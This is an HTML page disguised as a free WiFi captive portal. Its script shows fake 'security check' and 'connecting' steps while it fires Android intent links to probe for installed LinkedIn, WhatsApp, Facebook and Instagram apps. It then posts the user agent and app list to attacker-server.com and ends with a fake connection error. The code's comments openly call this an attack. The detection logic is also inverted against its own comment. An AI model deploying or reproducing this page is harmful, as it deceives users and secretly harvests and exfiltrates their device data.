<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi Portal</title>
</head>
<body>
    <div id="content">
        <h2>Welcome to Free WiFi</h2>
        <p>Please complete these steps to connect:</p>
        
        <div id="steps">
            <div class="step">1. Checking device compatibility... <span id="step1">‚è≥</span></div>
            <div class="step">2. Verifying security... <span id="step2">‚è≥</span></div>
            <div class="step">3. Connecting to network... <span id="step3">‚è≥</span></div>
        </div>
        
        <button onclick="startAttack()" id="startBtn" style="display:none;">
            Start Connection
        </button>
    </div>

    <script>
        async function startAttack() {
            document.getElementById('startBtn').style.display = 'none';
            
            // Step 1: Get basic device info
            document.getElementById('step1').innerHTML = '‚úÖ';
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Step 2: "Security check" - actually probing apps
            document.getElementById('step2').innerHTML = 'üîç';
            const detectedApps = await probeAppsWithUserInteraction();
            document.getElementById('step2').innerHTML = '‚úÖ';
            
            // Step 3: "Network connection" - sending data to attacker
            document.getElementById('step3').innerHTML = 'üì°';
            await sendToAttacker(detectedApps);
            document.getElementById('step3').innerHTML = '‚úÖ';
            
            // Show fake error
            document.getElementById('content').innerHTML = `
                <h2>Connection Failed</h2>
                <p>Unable to connect to WiFi at this time. Please try again later.</p>
                <p><small>Error code: WIFI-${Date.now()}</small></p>
            `;
        }

        function probeAppsWithUserInteraction() {
            return new Promise((resolve) => {
                const apps = [
                    'intent://linkedin.com/#Intent;scheme=linkedin;package=com.linkedin.android;end',
                    'intent://send?text=hello#Intent;scheme=whatsapp;package=com.whatsapp;end',
                    'intent://facebook.com/#Intent;scheme=fb;package=com.facebook.katana;end',
                    'intent://instagram.com/#Intent;scheme=instagram;package=com.instagram.android;end'
                ];

                let detected = [];
                let current = 0;

                function tryNextApp() {
                    if (current >= apps.length) {
                        resolve(detected);
                        return;
                    }

                    window.location = apps[current];
                    
                    setTimeout(() => {
                        // If still on page after 1 second, app didn't open
                        detected.push(apps[current]);
                        current++;
                        tryNextApp();
                    }, 1000);
                }

                tryNextApp();
            });
        }

        function sendToAttacker(apps) {
            return fetch('https://attacker-server.com/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    userAgent: navigator.userAgent,
                    apps: apps,
                    timestamp: new Date().toISOString()
                })
            });
        }

        // Show start button after page loads
        window.onload = () => {
            setTimeout(() => {
                document.getElementById('startBtn').style.display = 'block';
            }, 2000);
        };
    </script>
</body>
</html>